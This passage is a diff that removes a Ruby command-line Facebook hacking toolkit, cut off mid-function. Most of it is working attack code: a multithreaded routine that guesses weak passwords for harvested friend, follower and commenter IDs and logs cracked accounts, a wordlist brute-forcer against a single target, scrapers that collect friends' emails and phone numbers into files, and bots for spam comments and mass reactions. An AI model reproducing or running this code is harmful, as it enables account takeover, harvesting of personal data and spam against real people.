-        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-        Super()
-      else
-        puts ("#{$w}[+] Posted by #{a['from']['name']}")
-        b = Request("#{id}/comments?fields=from&summary=true&limit=5000")
-        c = b['data'].map {|i| {"id"=> i['from']['id'],"name"=> i['from']['name']}}.uniq
-        puts ("#{$w}[+] Total Id : #{c.length}")
-        puts ("#{$w}[!] CRACK!")
-        puts ("#{$w}#{'═'*52}")
-        main(c)
-        puts ("#{$w}#{'═'*52}")
-        puts ("#{$g}[✓] Total OK : #{$ok}")
-        puts ("#{$y}[!] Total CP : #{$cp}")
-        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-        Super()
-      end
-    when '5'
-      system ('clear')
-      puts ($logo)
-      puts ("#{$w}#{'═'*52}")
-      print ("#{$w}[+] Public Id : ")
-      id = gets.chomp! ; id.tr(" ","")
-      a = Request("#{id}?fields=name")
-      if a.key? ('error')
-        puts ("#{$y}[!] User Not Found")
-        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-        Super()
-      else
-        puts ("#{$w}[+] Crack From : #{a['name']}")
-        b = Request("#{id}/friends?")
-        c = b['data'].map {|i| i['id']}
-        puts ("#{$w}[+] Total id : #{c.length}")
-        puts ("#{$w}[+] CRACK!")
-        puts ("#{$w}#{'═'*52}")
-        main(b['data'])
-        puts ("#{$w}#{'═'*52}")
-        puts ("#{$g}[✓] Total OK : #{$ok}")
-        puts ("#{$y}[!] Total CP : #{$cp}")
-        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-       Super()
-      end
-    when '6'
-      system ('clear')
-      puts ($logo)
-      puts ("#{$w}#{'═'*52}")
-      print ("#{$w}[+] Public Id : ")
-      id = gets.chomp! ; id = id.tr(" ","")
-      a = Request("#{id}?fields=name,subscribers.limit(5000).summary(true)")
-      if a.key? ('error')
-        puts ("#{$r}[!] User Not Found")
-        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-        Super()
-      elsif a['subscribers']['data'].empty?
-        puts ("#{$y}[!] Account Has No Followers")
-        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-        Super()
-      else
-        #b = a['subscribers']['data'].map {|i| i['id']}
-        puts ("#{$w}[+] Crack From : #{a['name']}")
-        puts ("#{$w}[+] Total Followers : #{a['subscribers']['summary']['total_count']}")
-        b = a['subscribers']['data'].map {|i| i['id']}
-        puts ("#{$y}[!] Total ID that can be cracked : #{b.length}") if b.length != a['subscribers']['summary']['total_count']
-        puts ("#{$w}[+] CRACK!")
-        puts ("#{$w}#{'═'*52}")
-        main(a['subscribers']['data'])
-        puts ("#{$w}#{'═'*52}")
-        puts ("#{$g}[✓] Total OK : #{$ok}")
-        puts ("#{$y}[!] Total CP : #{$cp}")
-        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-        Super()
-      end
-    when '0'
-      Hamker()
-    else
-      puts ("#{$y}[!] Invalid Input")
-      sleep(0.8)
-      Super()
-  end
-end
-
-def main(data)
-  pool = ThreadPool.new(size: 30)
-  data.each do |usr|
-    pool.schedule do
-      begin
-        name = usr['name'].split
-        if name.length == 1
-          password = ['Anjing','Sayang','Kontol',name.first + '123',name.first + '12345']
-        else
-          password = ['Anjing','Sayang','Kontol',name.first + '123',name.first + '12345',name.last + '123',name.last + '12345']
-        end
-        for i in password
-          uri = URI("https://mbasic.facebook.com/login.php")
-          auth = {'email'=>usr['id'],'pass'=>i,'login'=>'submit'}
-          req = Net::HTTP::Post.new(uri)
-          req['user-agent'] = $user_agent
-          req.set_form_data(auth)
-          res = Net::HTTP.start(uri.host,uri.port,:use_ssl => true) {|http| http.request(req)}
-          kue = res['set-cookie']
-          if kue.include? ('c_user')
-            $ok += 1
-            File.open("super.txt","a") {|f| f.write("#{usr['id']} | #{i}\n")}
-            puts ("#{$g}[OK] #{usr['id']} | #{i}")
-            break
-          elsif kue.include? ('checkpoint')
-            $cp += 1
-            File.open("super.txt","a") {|f| f.write("#{usr['id']} | #{i}\n")}
-            puts ("#{$y}[CP] #{usr['id']} | #{i}")
-            break
-          end
-        end
-      rescue NoMethodError then next
-      rescue SocketError
-        puts ("#{$y}[!] No Connection")
-        sleep (0.2)
-      rescue Errno::ETIMEDOUT,Net::OpenTimeout
-        puts ("#{$y}[!] Connection timed out#{$a}")
-        sleep(0.2)
-      rescue Errno::ENETUNREACH,Errno::ECONNRESET
-        puts ("#{$y}[!] Slow Internet Connection")
-        sleep(0.5)
-      end
-    end
-  end
-  pool.shutdown
-end
-      
-
-def Brutal()
-  system ('clear')
-  puts ($logo)
-  puts ("#{$w}#{'═'*52}")
-  print ("#{$r}[+] #{$g}Id#{$w}/#{$g}email#{$w}/#{$g}Phone #{$w}(#{$g}Target#{$w}) #{$r}: ")
-  id = gets.chomp!
-  print ("#{$r}[+] #{$g}Wordlist #{$w}ext(list.txt)  #{$r}: ")
-  file = gets.chomp!
-  if File.file? (file)
-    password = File.readlines(file, chomp: true)
-    puts ("#{$r}[#{$c}✓#{$r}] #{$g}Target #{$r}: #{$w}#{id}")
-    puts ("#{$r}[+] #{$g}Total #{$c}#{password.length} #{$g}Password ")
-    puts ("#{$w}#{'═'*52}")
-    for pw in password
-      begin
-        uri = URI ("https://mbasic.facebook.com/login.php")
-        req = Net::HTTP::Post.new(uri)
-        req.set_form_data({"email"=>id,"pass"=>pw,"login"=>"submit"})
-        req['user-agent'] = $user_agent
-        puts ("#{$r}[+] #{$g}Login As #{$r}: #{$w}-> #{$g}#{id} #{$w}-> #{$g}#{pw}#{$a}")
-        log = Net::HTTP.start(uri.host,uri.port,:use_ssl => true) {|http| http.request(req)}
-        res = log['set-cookie']
-        if res.include? ('c_user')
-          puts ("#{$w}#{'═'*52}")
-          puts ("#{$g}[✓] Success")
-          puts ("#{$g}[✓] username : #{id}")
-          puts ("#{$g}[✓] password : #{pw}")
-          abort ("#{$r}[!] exit")
-        elsif res.include? ('checkpoint')
-          puts ("#{$w}#{'═'*52}")
-          puts ("#{$y}[!] Account Has Been Checkpoint")
-          puts ("#{$y}[✓] username : #{id}")
-          puts ("#{$y}[✓] password : #{pw}")
-          abort ("#{$y}[!] exit")
-        end
-      rescue SocketError
-        puts ("#{$r}[!] No Connection")
-        sleep(0.2)
-      rescue Errno::ETIMEDOUT,Net::OpenTimeout
-        puts ("#{$y}[!] Connection timed out")
-        sleep(0.5)
-      rescue Interrupt
-        puts ("\n#{$w}#{'═'*52}")
-        abort("#{$w}[+] Stopped")
-      end
-    end
-    puts ("#{$w}#{'═'*52}")
-    puts ("#{$r}[!] Sorry, opening password target failed :(")
-    abort ("#{$r}[!] Try other method.")
-  else
-    puts ("#{$y}[+] File Not Found")
-    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-    Hamker()
-  end
-end
-
-def GetMenu()
-  total = 0
-  system ('clear')
-  puts ($logo)
-  puts ("#{$w}#{'═'*52}")
-  puts ("║-> #{$w}1. Get ID From Friends")
-  puts ("║-> #{$w}2. Get Friends ID From Friends")
-  puts ("║-> #{$w}3. Get Friends Email")
-  puts ("║-> #{$w}4. Get Friends Email From Friends")
-  puts ("║-> #{$w}5. Get Phone From Friends")
-  puts ("║-> #{$w}6. Get Friend\s Phone From Friends")
-  puts ("║-> #{$w}0. Back")
-  print ("╚═#{$r}▶#{$w} ")
-  get = gets.chomp!
-  case get
-    when '1'
-      system ('clear')
-      puts ($logo)
-      puts ("#{$w}#{'═'*52}")
-      tik ("#{$w}[+] Pleace Wait....")
-      a = Request("me/friends?")
-      abort ("#{$r}[!] Invalid Access Token") if a.key? ('error')
-      print ("#{$w}[+] Save File (file.txt) : ")
-      file = gets.chomp!
-      file = "id.txt" if file == "" or file[0] == " "
-      File.open(file,'w') do |id|
-        puts ("#{$w}#{'═'*52}")
-        for i in a['data']
-          total += 1
-          id << i['id'] + "\n"
-          puts ("#{$g}[✓] Name : #{i['name']}")
-          puts ("#{$g}[✓] Id.  : #{i['id']}")
-          puts ("#{$w}#{'═'*52}")
-        end
-      end
-      puts ("#{$g}[✓] Total Id : #{total}")
-      puts ("#{$g}[✓] File : #{File.basename(file)}")
-      puts ("#{$g}[✓] File Path #{File.realpath(file)}")
-      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-      GetMenu()
-    when '2'
-      system ('clear')
-      puts ($logo)
-      puts ("#{$w}#{'═'*52}")
-      print ("#{$w}[+] Public Id : ")
-      id = gets.chomp!
-      a = Request("#{id}?")
-      if a.key? ('error')
-        puts ("#{$y}[+] User Not Found")
-        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-        GetMenu()
-      else
-        tik("#{$w}[+] From #{a['name']}")
-        b = Request("#{id}/friends?")
-        print ("#{$w}[+] Save File (file.txt) : ")
-        file = gets.chomp!
-        file = a['name'] + ".txt" if file == "" or file[0] == " "
-        File.open(file,'w') do |id|
-          puts ("#{$w}#{'═'*52}")
-          for i in b['data']
-            total += 1
-            id << i['id'] + "\n"
-            puts ("#{$g}[✓] Name : #{i['name']}")
-            puts ("#{$g}[✓] Id.  : #{i['id']}")
-            puts ("#{$w}#{'═'*52}")
-          end
-        end
-        puts ("#{$g}[✓] Total Id : #{total}")
-        puts ("#{$g}[✓] File : #{File.basename(file)}")
-        puts ("#{$g}[✓] File Path #{File.realpath(file)}")
-        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-        GetMenu()
-      end
-    when '3'
-      system ('clear')
-      puts ($logo)
-      puts ("#{$w}#{'═'*52}")
-      tik ("#{$w}[+] Pleace Wait....")
-      a = Request("me/friends?")
-      abort ("#{$r}[!] Invalid Access Token") if a.key? ('error')
-      print ("#{$w}[+] Save File (file.txt) : ")
-      file = gets.chomp!
-      file = "email.txt" if file == "" or file[0] == " "
-      File.open(file,"w") do |id|
-        puts ("#{$w}#{'═'*52}")
-        for i in a['data']
-          b = Request("#{i['id']}?")
-          if b.key? ('email')
-            total += 1
-            id << b['email'] + "\n"
-            puts ("#{$g}[✓] Name : #{i['name']}")
-            puts ("#{$g}[✓] email: #{b['email']}")
-            puts ("#{$w}#{'═'*52}")
-          end
-        end
-      end
-      puts ("#{$g}[✓] Total email : #{total}")
-      puts ("#{$g}[✓] File : #{File.basename(file)}")
-      puts ("#{$g}[✓] File Path #{File.realpath(file)}")
-      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-      GetMenu()
-    when '4'
-      system ('clear')
-      puts ($logo)
-      puts ("#{$w}#{'═'*52}")
-      print ("#{$w}[+] Public Id : ")
-      id = gets.chomp!
-      a = Request("#{id}?")
-      if a.key? ('error')
-        puts ("#{$y}[+] User Not Found")
-        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-        GetMenu()
-      else
-        tik ("#{$w}[+] From #{a['name']}")
-        b = Request("#{id}/friends?")
-        print ("#{$w}[+] Save File (file.txt) : ")
-        file = gets.chomp!
-        file = a['name'] + ".txt" if file == "" or file[0] == " "
-        File.open(file,"w") do |id|
-          puts ("#{$w}#{'═'*52}")
-          for i in b['data']
-            c = Request("#{i['id']}?")
-            if c.key? ('email')
-              total += 1
-              id << c['email'] + "\n"
-              puts ("#{$g}[✓] Name : #{i['name']}")
-              puts ("#{$g}[✓] email: #{b['email']}")
-              puts ("#{$w}#{'═'*52}")
-            end
-          end
-        end
-        puts ("#{$g}[✓] Total email : #{total}")
-        puts ("#{$g}[✓] File : #{File.basename(file)}")
-        puts ("#{$g}[✓] File Path #{File.realpath(file)}")
-        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-        GetMenu()
-      end
-    when '5'
-      system ('clear')
-      puts ($logo)
-      puts ("#{$w}#{'═'*52}")
-      tik ("#{$w}[+] Pleace Wait....")
-      a = Request("me/friends?")
-      abort ("#{$r}[!] Invalid Access Token") if a.key? ('error')
-      print ("#{$w}[+] Save File (file.txt) : ")
-      file = gets.chomp!
-      file = "MobilePhone.txt" if file == "" or file[0] == " "
-      File.open(file,"w") do |id|
-        puts ("#{$w}#{'═'*52}")
-        for i in a['data']
-          b = Request("#{i['id']}?")
-          if b.key? ('mobile_phone')
-            total += 1
-            id << b['mobile_phone'] + "\n"
-            puts ("#{$g}[✓] Name : #{i['name']}")
-            puts ("#{$g}[✓] phone: #{b['mobile_phone']}")
-            puts ("#{$w}#{'═'*52}")
-          end
-        end
-      end
-      puts ("#{$g}[✓] Total phone : #{total}")
-      puts ("#{$g}[✓] File : #{File.basename(file)}")
-      puts ("#{$g}[✓] File Path #{File.realpath(file)}")
-      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-      GetMenu()
-    when '6'
-      system ('clear')
-      puts ($logo)
-      puts ("#{$w}#{'═'*52}")
-      print ("#{$w}[+] Public Id : ")
-      id = gets.chomp!
-      a = Request("#{id}?")
-      if a.key? ('error')
-        puts ("#{$y}[!] User Not Found")
-        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-        GetMenu()
-      else
-        tik ("#{$w}[+] From #{a['name']}")
-        b = Request("#{id}/friends?")
-        print ("#{$w}[+] Save File (file.txt) : ")
-        file = gets.chomp!
-        file = a['name'] + ".txt" if file == "" or file[0] == " "
-        File.open(file,"w") do |id|
-          puts ("#{$w}#{'═'*52}") 
-          for i in b['data']
-            c = Request("#{i['id']}?")
-            if c.key? ('mobile_phone')
-              total += 1
-              id << c['mobile_phone'] + "\n"
-              puts ("#{$g}[✓] Name : #{i['name']}")
-              puts ("#{$g}[✓] phone: #{c['mobile_phone']}")
-              puts ("#{$w}#{'═'*52}")
-            end
-          end
-        end
-        puts ("#{$g}[✓] Total phone : #{total}")
-        puts ("#{$g}[✓] File : #{File.basename(file)}")
-        puts ("#{$g}[✓] File Path #{File.realpath(file)}")
-        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-        GetMenu() 
-      end
-    when '0'
-      Hamker()
-    else
-      puts ("#{$y}[!] Invalid Input")
-      sleep(0.9) ; GetMenu()
-  end
-end
-
-def Bot()
-  system ('clear')
-  puts ($logo)
-  puts ("#{$w}#{'═'*52}")
-  puts ("#{$w}║-> 1. Post Reaction")
-  puts ("#{$w}║-> 2. Post comments")
-  puts ("#{$w}║-> 3. Add Friend")
-  puts ("#{$w}║-> 4. Follow")
-  puts ("#{$w}║-> 5. Share Post")
-  puts ("#{$w}║-> 6. Delete Post")
-  puts ("#{$w}║-> 7. Unfriends")
-  puts ("#{$w}║-> 8. Unfollow")
-  puts ("#{$w}║-> #{$g}0. Back")
-  puts ("#{$w}║")
-  print ("╚═#{$r}▶#{$w} ")
-  bots = gets.chomp!
-  case bots
-    when '1'
-      ReactPostMenu()
-    when '2'
-      CommentPostMenu()
-    when '3'
-      AddFriendMenu()
-    when '4'
-      FollowMenu()
-    when '5'
-      system ('clear')
-      puts ($logo)
-      puts ("#{$w}#{'═'*52}")
-      print ("#{$w}[+] Post Id : ")
-      id = gets.chomp!
-      a = Request("#{id}?fields=from,id")
-      if !a.key? ('id')
-        puts ("#{$y}[!] Post Not Found")
-      else
-        SharePost(link = "https://www.facebook.com/#{id}")
-      end
-      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-      Bot()
-    when '6'
-      s = 0
-      f = 0
-      system ('clear')
-      puts ($logo)
-      puts ("#{$w}#{'═'*52}")
-      puts ("#{$w}[+] From #{$name}")
-      puts ("#{$w}[+] CTRL + C TO STOP")
-      puts ("#{$w}[+] START..")
-      puts ("#{$w}#{'═'*52}")
-      a = Request("me/feed?limit=5000")
-      for i in a['data']
-        begin
-          id = i['id']
-          b = Request("DELETE","#{id}?")
-          if b == true
-            s += 1
-            puts ("#{$w}[#{$g}✓#{$w}] #{$g}Succes : #{$c}#{$name} #{$w}-> #{$y}#{id}")
-          else
-            f += 1
-            puts ("#{$w}[#{$y}!#{$w}] #{$y}Failed : #{$c}#{$name} #{$w}-> #{$y}#{id}")
-          end
-        rescue Interrupt
-          puts ("\n#{$w}#{'═'*52}")
-          puts ("#{$r}[!] Stopped")
-          puts ("#{$g}[✓] Succes : #{s}")
-          puts ("#{$y}[!] Failed : #{f}")
-          puts ("#{$w}[+] Total  : #{s + f}#{$a}")
-          print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-          Bot()
-        end
-      end
-      puts ("#{$w}#{'═'*52}")
-      puts ("#{$g}[✓] Succes : #{s}")
-      puts ("#{$y}[!] Failed : #{f}")
-      puts ("#{$w}[+] Total  : #{s + f}#{$a}")
-      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-      Bot()
-    when '7'
-      s = 0
-      f = 0
-      system ('clear')
-      puts ($logo)
-      puts ("#{$w}#{'═'*52}")
-      puts ("#{$w}[+] From #{$name}")
-      puts ("#{$w}[+] CTRL + C TO STOP")
-      puts ("#{$w}[+] START")
-      puts ("#{$w}#{'═'*52}")
-      a = Request("me/friends?")
-      if a.key? ('error')
-        puts (a)
-        abort ("#{$r}[!] Error")
-      else
-        for i in a['data']
-          begin
-            id = i['id']
-            name = i['name']
-            b = Request("DELETE","me/friends?uid=#{id}")
-            if b == true
-              s += 1
-              puts ("#{$w}[#{$g}✓#{$w}] #{$g}Succes : #{$c}#{name} #{$w}-> #{$y}#{id}")
-            else
-              f += 1
-              puts ("#{$w}[#{$y}!#{$w}] #{$y}Failed : #{$c}#{name} #{$w}-> #{$y}#{id}")
-            end
-          rescue Interrupt
-            puts ("\n#{$w}#{'═'*52}")
-            puts ("#{$r}[!] Stopped")
-            puts ("#{$g}[✓] Succes : #{s}")
-            puts ("#{$y}[!] Failed : #{f}")
-            puts ("#{$w}[+] Total  : #{s + f}#{$a}")
-            print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-            Bot()
-          end
-        end
-        puts ("#{$w}#{'═'*52}")
-        puts ("#{$g}[✓] Succes : #{s}")
-        puts ("#{$y}[!] Failed : #{f}")
-        puts ("#{$w}[+] Total  : #{s + f}#{$a}")
-        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-        Bot()
-      end
-    when '8'
-      s = 0
-      f = 0
-      system ('clear')
-      puts ($logo)
-      puts ("#{$w}#{'═'*52}")
-      puts ("#{$w}[+] From #{$name}")
-      puts ("#{$w}[+] CTRL + C TO STOP")
-      puts ("#{$w}[+] START")
-      puts ("#{$w}#{'═'*52}")
-      a = Request("me/subscribedto?")
-      for i in a['data']
-        begin
-          id = i['id']
-          name = i['name']
-          b = Request("DELETE","#{id}/subscribers?")
-          if b == true
-            s += 1
-            puts ("#{$w}[#{$g}✓#{$w}] #{$g}Succes : #{$c}#{name} #{$w}-> #{$y}#{id}")
-          else
-            f += 1
-            puts ("#{$w}[#{$y}!#{$w}] #{$y}Failed : #{$c}#{name} #{$w}-> #{$y}#{id}")
-          end
-        rescue Interrupt
-          puts ("\n#{$w}#{'═'*52}")
-          puts ("#{$r}[!] Stopped")
-          puts ("#{$g}[✓] Succes : #{s}")
-          puts ("#{$y}[!] Failed : #{f}")
-          puts ("#{$w}[+] Total  : #{s + f}#{$a}")
-          print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-          Bot()
-        end
-      end
-      puts ("#{$w}#{'═'*52}")
-      puts ("#{$g}[✓] Succes : #{s}")
-      puts ("#{$y}[!] Failed : #{f}")
-      puts ("#{$w}[+] Total  : #{s + f}#{$a}")
-      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-      Bot()
-    when '0'
-      menu()
-    else
-      puts ("#{$y}[!] Invalid Input")
-      sleep(0.9)
-      Bot()
-  end 
-end
-
-def ReactPostMenu()
-  system ('clear')
-  puts ($logo)
-  puts ("#{$w}#{'═'*52}")
-  puts ("#{$w}║-> 1. Target Post Reaction")
-  puts ("#{$w}║-> 2. Group Post Reactions")
-  puts ("#{$w}║-> 3. Random Target Post Reaction")
-  puts ("#{$w}║-> 4. Random Group Post Reaction")
-  puts ("#{$w}║-> #{$g}0. Back")
-  puts ("#{$w}║")
-  print ("╚═#{$r}▶#{$w} ")
-  mana = gets.chomp!
-  case mana 
-    when '0'
-      Bot()
-    when '1'
-      ReactPost()
-    when '2'
-      ReactGroup()
-    when '3'
-      ReactPostRandom()
-    when '4'
-      ReactGroupRandom()
-    else
-      puts ("#{$y}[!] Invalid Input")
-      sleep(0.9) ; ReactPostMenu()
-  end
-end
-
-def React()
-  loop do
-    system("clear")
-    puts ($logo)
-    puts ("#{$w}#{'═'*52}")
-    puts ("#{$w}║-> #{$p}1. LIKE")
-    puts ("#{$w}║-> #{$m}2. LOVE")
-    puts ("#{$w}║-> #{$y}3. HAHA")
-    puts ("#{$w}║-> #{$y}4. WOW")
-    puts ("#{$w}║-> #{$c}5. SAD")
-    puts ("#{$w}║-> #{$r}6. ANGRY")
-    puts ("#{$w}║")
-    print ("╚═#{$r}▶#{$w} ")
-    pilih = gets.chomp!
-    if pilih == '1' or pilih == '01'
-      return 'LIKE'
-    elsif pilih == '2' or pilih == '02'
-      return 'LOVE'
-    elsif pilih == '3' or pilih == '03'
-      return 'HAHA'
-    elsif pilih == '4' or pilih == '04'
-      return 'WOW'
-    elsif pilih == '5' or pilih == '05'
-      return 'SAD'
-    elsif pilih == '6' or pilih == '06'
-      return 'ANGRY'
-    else
-      puts ("#{$y}[!] Invalid Input")
-      sleep(1)
-    end
-  end
-end
-
-def ReactPost()
-  s = 0
-  f = 0
-  tipe = React()
-  system ('clear')
-  puts ($logo)
-  puts ("#{$w}#{'═'*52}")
-  print ("#{$w}[+] Target Id : ")
-  id = gets.chomp! ; id = id.tr(" ","")
-  print ("#{$w}[+] Limits : ")
-  limit = gets.to_i
-  puts ("#{$w}#{'═'*52}")
-  a = Request("#{id}?fields=feed.limit(#{limit})")
-  if !a.key? ('feed')
-    puts ("#{$y}[!] No Posts") if a.key? ('id')
-    puts ("#{$y}[!] user Not Found!") if a.key? ('error')
-    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-    ReactPostMenu()
-  else
-    for i in a['feed']['data']
-      id = i['id']
-      a = Request("POST","#{id}/reactions?type=#{tipe}")
-      if !a.key? ('error')
-        s += 1 
-        puts ("#{$w}[#{$g}✓#{$w}] #{$g}Succes #{$w}-> #{$c}#{tipe} #{$w}-> #{$y}#{id}")
-      else
-        f += 1
-        puts ("#{$w}[#{$y}!#{$w}] #{$r}Failed #{$w}-> #{$c}#{tipe} #{$w}-> #{$y}#{id}")
-      end
-    end
-    puts ("#{$w}#{'═'*52}")
-    puts ("#{$g}[✓] Succes : #{s}")
-    puts ("#{$y}[!] Failed : #{f}")
-    puts ("#{$w}[+] Total  : #{s + f}#{$a}")
-    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-    ReactPostMenu()
-  end
-end
-
-def ReactPostRandom()
-  s = 0
-  f = 0
-  type = ['LIKE','LOVE','WOW','HAHA','ANGRY','SAD']
-  system ('clear')
-  puts ($logo)
-  puts ("#{$w}#{'═'*52}")
-  print ("#{$w}[+] Target Id : ")
-  id = gets.chomp! ; id = id.tr(" ","")
-  print ("#{$w}[+] Limit : ")
-  limit = gets.to_i
-  puts ("#{$w}#{'═'*52}")
-  a = Request("#{id}?fields=feed.limit(#{limit})")
-  if !a.key? ('feed')
-    puts ("#{$y}[!] No Posts") if a.key? ('id')
-    puts ("#{$y}[!] user Not Found!") if a.key? ('error')
-    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-    ReactPostMenu()
-  else
-    for i in a['feed']['data']
-      tipe = type.sample
-      id = i['id']
-      b = Request("POST","#{id}/reactions?type=#{tipe}")
-      if !b.key? ('error')
-        s += 1
-        puts ("#{$w}[#{$g}✓#{$w}] #{$g}Succes #{$w}-> #{$c}#{tipe} #{$w}-> #{$y}#{id}")
-      else
-        f += 1
-        puts ("#{$w}[#{$y}!#{$w}] #{$r}Failed #{$w}-> #{$c}#{tipe} #{$w}-> #{$y}#{id}")
-      end
-    end
-    puts ("#{$w}#{'═'*52}")
-    puts ("#{$g}[✓] Succes : #{s}")
-    puts ("#{$y}[!] Failed : #{f}")
-    puts ("#{$w}[+] Total  : #{s + f}#{$a}")
-    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-    ReactPostMenu()
-  end
-end
-
-def ReactGroup()
-  tipe = React()
-  s = 0
-  f = 0
-  system ('clear')
-  puts ($logo)
-  puts ("#{$w}#{'═'*52}")
-  print ("#{$w}[+] Group Id : ")
-  id = gets.chomp!
-  print ("#{$w}[+] Limit : ")
-  limit = gets.to_i
-  a = Request("group?id=#{id}")
-  if a.key? ('error')
-    puts ("#{$y}[!] Group Not Found")
-    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-    ReactPostMenu()
-  else
-    tik ("#{$w}[+] Group Name : #{a['name']}")
-    puts ("#{$w}#{'═'*52}")
-    b = Request("v3.0/#{id}?fields=feed.limit(#{limit})")
-    if !b.key? ('feed')
-      puts ("#{$y}[!] No Post")
-      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-      ReactPostMenu()
-    else
-      for i in b['feed']['data']
-        id = i['id']
-        c = Request("POST","#{id}/reactions?type=#{tipe}")
-        if !c.key? ('error')
-          s += 1
-          puts ("#{$w}[#{$g}✓#{$w}] #{$g}Succes #{$w}-> #{$c}#{tipe} #{$w}-> #{$y}#{id}")
-        else
-          f += 1
-          puts ("#{$w}[#{$y}!#{$w}] #{$r}Failed #{$w}-> #{$c}#{tipe} #{$w}-> #{$y}#{id}")
-        end
-      end
-      puts ("#{$w}#{'═'*52}")
-      puts ("#{$g}[✓] Succes : #{s}")
-      puts ("#{$y}[!] Failed : #{f}")
-      puts ("#{$w}[+] Total  : #{s + f}#{$a}")
-      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-      ReactPostMenu()
-    end
-  end
-end
-
-def ReactGroupRandom()
-  type = ['LIKE','LOVE','WOW','HAHA','ANGRY','SAD']
-  s = 0
-  f = 0
-  system ('clear')
-  puts ($logo)
-  puts ("#{$w}#{'═'*52}")
-  print ("#{$w}[+] Group Id : ")
-  id = gets.chomp!
-  print ("#{$w}[+] Limit : ")
-  limit = gets.to_i
-  a = Request("group?id=#{id}")
-  if a.key? ('error')
-    puts ("#{$y}[!] Group Not Found")
-    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-    ReactPostMenu()
-  else
-    tik ("#{$w}[+] Group Name : #{a['name']}")
-    puts ("#{$w}#{'═'*52}")
-    b = Request("v3.0/#{id}?fields=feed.limit(#{limit})")
-    if !b.key? ('feed')
-      puts ("#{$y}[!] No Post")
-      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-      ReactPostMenu()
-    else
-      for i in b['feed']['data']
-        tipe = type.sample
-        id = i['id']
-        c = Request("POST","#{id}/reactions?type=#{tipe}")
-        if !c.key? ('error')
-          s += 1
-          puts ("#{$w}[#{$g}✓#{$w}] #{$g}Succes #{$w}-> #{$c}#{tipe} #{$w}-> #{$y}#{id}")
-        else
-          f += 1
-          puts ("#{$w}[#{$y}!#{$w}] #{$r}Failed #{$w}-> #{$c}#{tipe} #{$w}-> #{$y}#{id}")
-        end
-      end
-      puts ("#{$w}#{'═'*52}")
-      puts ("#{$g}[✓] Succes : #{s}")
-      puts ("#{$y}[!] Failed : #{f}")
-      puts ("#{$w}[+] Total  : #{s + f}#{$a}")
-      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-      ReactPostMenu()
-    end
-  end
-end    
-
-def CommentPostMenu()
-  system("clear")
-  puts ($logo)
-  puts ("#{$w}#{'═'*52}")
-  puts ("#{$w}║-> 1. Comment Target Post")
-  puts ("#{$w}║-> 2. Comment Group Post")
-  puts ("#{$w}║-> 3. Reply Comment")
-  puts ("#{$w}║-> 4. Spam Comment")
-  puts ("#{$w}║-> #{$g}0. Back")
-  puts ("#{$w}║")
-  print ("╚═#{$r}▶#{$w} ")
-  mana = gets.chomp!
-  case mana
-    when'1'
-      CommentPost()
-    when '2'
-      CommentGroup()
-    when '3'
-      ReplyComment()
-    when '4'
-      SpamComment()
-    when '0'
-      Bot()
-    else
-      puts ("#{$y}[!] Invalid Input")
-      sleep(0.9)
-      CommentPostMenu()
-  end
-end
-
-def CommentPost()
-  s = 0
-  f = 0
-  system ('clear')
-  puts ($logo)
-  puts ("#{$w}[!] Use <> For New Line")
-  puts ("#{$w}#{'═'*52}")
-  print ("#{$w}[+] Target Id : ")
-  id = gets.chomp!
-  print ("#{$w}[+] Comment : ")
-  body = gets.chomp!
-  print ("#{$w}[+] Limit : ")
-  limit = gets.to_i
-  puts ("#{$w}#{'═'*52}")
-  sub = body.tr("<>","\n")
-  msg = ERB::Util.url_encode(sub)
-  a = Request("#{id}?fields=feed.limit(#{limit})")
-  if !a.key? ('feed')
-    puts ("#{$y}[!] No Posts") if a.key? ('id')
-    puts ("#{$y}[!] user Not Found!") if a.key? ('error')
-    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-    CommentPostMenu()
-  else
-    for i in a['feed']['data']
-      id = i['id']
-      b = Request("POST","#{id}/comments?message=#{msg}")
-      if !b.key? ('error')
-        s += 1
-        puts ("#{$w}[#{$g}✓#{$w}] #{$g}Success : #{$c}#{body[0...6]}... #{$w}-> #{$y}#{id}")
-      else
-        f += 1
-        puts ("#{$w}[#{$y}!#{$w}] #{$y}Failed  : #{$c}#{body[0...6]}... #{$w}-> #{$y}#{id}")
-      end
-    end
-    puts ("#{$w}#{'═'*52}")
-    puts ("#{$g}[✓] Succes : #{s}")
-    puts ("#{$y}[!] Failed : #{f}")
-    puts ("#{$w}[+] Total  : #{s + f}#{$a}")
